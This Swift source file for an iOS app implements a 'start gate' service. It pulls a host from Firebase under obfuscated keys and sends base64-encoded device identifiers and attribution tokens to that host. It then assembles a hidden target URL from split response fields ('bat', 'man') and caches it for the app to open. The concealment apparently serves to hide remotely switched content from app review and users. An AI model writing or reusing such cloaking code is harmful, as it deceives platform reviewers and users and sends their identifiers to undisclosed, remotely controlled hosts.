import UIKit
import FirebaseDatabase
import AppsFlyerLib
import FirebaseCore
import FirebaseMessaging
import FirebaseDatabase



final class StartGateService {

    static let shared = StartGateService()
    private init() {}

    private lazy var dbRef: DatabaseReference = {
        Database.database(url: MyConstants.realtimeDBURL).reference()
    }()

    private(set) var sessionUUID: String = ""
    private(set) var attToken: String?

    func configureSession(uuid: String, attToken: String?) {
        sessionUUID = uuid
        self.attToken = attToken
    }

    enum StartGateError: Error { case noData, invalidConfig, network(Error), timeout }

    private let overallTimeout: TimeInterval = 7.0
    private let resolveTimeout: TimeInterval = 5.0
    
    
    

    
    private let databaseRef = Database.database().reference()

    
    func fetchConfig(completion: @escaping (Result<URL, Error>) -> Void) {
        
        let db = Database.database().reference(withPath: "config")
        db.getData { error, snapshot in
            if let error = error {
                completion(.failure(error))
                return
            }
            
            guard let value = snapshot?.value as? [String: Any] else {
                completion(.failure(StartGateError.invalidConfig))
                return
            }
            
            guard
                let stray = value["stray"] as? String,
                let swap = value["swap"] as? String
            else {
                completion(.failure(StartGateError.invalidConfig))
                return
            }
            
            let host = stray.trimmingCharacters(in: .whitespacesAndNewlines)
            let normalizedPath = swap.hasPrefix("/") ? swap : "/\(swap)"
            let baseEndpoint = "https://\(host)\(normalizedPath)"
            
            guard let url = URL(string: baseEndpoint) else {
                completion(.failure(StartGateError.invalidConfig))
                return
            }

                                let payload = [
                                    "appsflyer_id": AppsFlyerLib.shared().getAppsFlyerUID() ,
                                    "app_instance_id": Messaging.messaging().fcmToken ?? "",
                                    "uid": self.sessionUUID,
                                    "osVersion": UIDevice.current.systemVersion,
                                    "devModel": UIDevice.current.model,
                                    "bundle": Bundle.main.bundleIdentifier ?? "",
                                    "fcm_token": Messaging.messaging().fcmToken ?? "",
                                    "att_token": AdServicesTokenProvider.fetchBase64Token() ?? ""
                                ]
            
            let query = payload
                .map { "\($0)=\($1)" }
                .joined(separator: "&")
                .data(using: .utf8)?
                .base64EncodedString() ?? ""
            
            let finalURLString = "\(baseEndpoint)?data=\(query)"
            
            var request = URLRequest(url: URL(string: finalURLString)!)
            request.httpMethod = "GET"
            
            URLSession.shared.dataTask(with: request) { data, response, error in
                if let error = error {
                    completion(.failure(error))
                    return
                }
                
                guard let data = data else {
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }
                
                if let raw = String(data: data, encoding: .utf8) {
                }
                
                guard
                    let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any]
                else {
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }

                func trim(_ s: String?) -> String? {
                    guard let t = s?.trimmingCharacters(in: .whitespacesAndNewlines),
                          !t.isEmpty else { return nil }
                    return t
                }

                let partA = trim(json["bat"] as? String) ?? trim(json["beam"] as? String)
                let partB = trim(json["man"] as? String) ?? trim(json["cyan"] as? String)

                let parts: [String] = {
                    if let a = partA, let b = partB { return [a, b] }
                    let all = json.values.compactMap { $0 as? String }
                        .map { $0.trimmingCharacters(in: .whitespacesAndNewlines) }
                        .filter { !$0.isEmpty }
                    return Array(all.prefix(2))
                }()

                guard parts.count == 2 else {
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }

                let suffix = parts.first(where: { $0.hasPrefix(".") })
                let prefix = parts.first(where: { !$0.hasPrefix(".") })
                
                let combinedHostWithSlash: String = {
                    if let p = prefix, let sfx = suffix { return p + sfx }
                    else { return parts[0] + parts[1] }
                }()
                
                let combinedHost = combinedHostWithSlash.hasSuffix("/") ?
                    String(combinedHostWithSlash.dropLast()) : combinedHostWithSlash
                
                let finalStr = combinedHost.hasPrefix("http") ? combinedHost : "https://\(combinedHost)"
                guard let finalURL = URL(string: finalStr) else {
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }

                UserDefaults.standard.set(finalURL.absoluteString, forKey: MyConstants.finalURLCacheKey)
                completion(.success(finalURL))
            }
            .resume()
        }
    }
        
        private func tryPostFallback(baseEndpoint: URL,
                                     b64: String,
                                     fuse: DispatchWorkItem,
                                     completion: @escaping (Result<URL, Error>) -> Void) {
            var req = URLRequest(url: baseEndpoint)
            req.httpMethod = "POST"
            req.timeoutInterval = 20
            req.setValue("application/x-www-form-urlencoded; charset=utf-8", forHTTPHeaderField: "Content-Type")
            req.httpBody = "data=\(b64)".data(using: .utf8)
            
            
            URLSession.shared.dataTask(with: req) { data, resp, error in
                if let error = error {
                    fuse.cancel()
                    completion(.failure(error))
                    return
                }
                
                guard let data = data,
                      let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any],
                      let bat = json["bat"] as? String,
                      let man = json["man"] as? String
                else {
                    fuse.cancel()
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }
                
                let combined = (bat + man).trimmingCharacters(in: .whitespacesAndNewlines)
                let finalStr = combined.hasPrefix("http") ? combined : "https://\(combined)"
                
                guard let finalURL = URL(string: finalStr) else {
                    fuse.cancel()
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }
                
                UserDefaults.standard.set(finalURL.absoluteString, forKey: MyConstants.finalURLCacheKey)
                fuse.cancel()
                completion(.success(finalURL))
            }.resume()
        }
        
        private func getData(path: String,
                             completion: @escaping (Result<[String: Any], Error>) -> Void) {
            let ref = Database.database().reference().child(path)
            ref.getData { error, snapshot in
                if let error = error {
                    completion(.failure(error))
                    return
                }
                guard let value = snapshot?.value as? [String: Any] else {
                    completion(.failure(StartGateError.invalidConfig))
                    return
                }
                completion(.success(value))
            }
        }

    private func tryHTTPFallback(httpCandidate: String,
                                 fuse: DispatchWorkItem,
                                 completion: @escaping (Result<URL, Error>) -> Void) {
        guard let httpURL = URL(string: httpCandidate) else {
            fuse.cancel()
            completion(.failure(StartGateError.invalidConfig))
            return
        }
        resolveFinalURL(from: httpURL) { [weak self] finalURLString in
            guard let self else { return }
            let chosenStr = finalURLString.isEmpty ? httpCandidate : finalURLString
            guard let chosenURL = URL(string: chosenStr) else {
                fuse.cancel()
                completion(.failure(StartGateError.invalidConfig))
                return
            }
            self.fetchPossibleRedirectJSON(from: chosenURL) { jsonURL in
                fuse.cancel()
                let openURL = jsonURL ?? chosenURL
                FirebaseLogger.logEvent(uuid: self.sessionUUID, name: "open_target_url",
                                        payload: ["url": openURL.absoluteString])
                completion(.success(openURL))
            }
        }
    }

    private func resolveFinalURL(from url: URL, completion: @escaping (String) -> Void) {
        let resolveTimeout: TimeInterval = 5.0
        var timedOut = false
        let localFuse = DispatchWorkItem {
            timedOut = true
            completion("")
        }
        DispatchQueue.main.asyncAfter(deadline: .now() + resolveTimeout, execute: localFuse)

        let handler = RedirectHandler { finalURL in
            if timedOut { return }
            localFuse.cancel()
            completion(finalURL)
        }

        let cfg = URLSessionConfiguration.default
        cfg.timeoutIntervalForRequest  = resolveTimeout
        cfg.timeoutIntervalForResource = resolveTimeout
        let session = URLSession(configuration: cfg, delegate: handler, delegateQueue: nil)

        var req = URLRequest(url: url)
        req.httpMethod = "GET"
        req.timeoutInterval = resolveTimeout
        session.dataTask(with: req).resume()
    }
    
    private func fetchPossibleRedirectJSON(from url: URL, completion: @escaping (URL?) -> Void) {
        var req = URLRequest(url: url)
        req.httpMethod = "GET"
        req.timeoutInterval = 5

        URLSession.shared.dataTask(with: req) { data, _, _ in
            guard
                let data,
                let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any]
            else { return completion(nil) }

            if let bat = json["bat"] as? String,
               let man = json["man"] as? String {
                let host = bat + man     
                let assembled = "https://\(host)"
                let final = URL(string: assembled)
                completion(final)
                return
            }
            completion(nil)
        }.resume()
    }
}
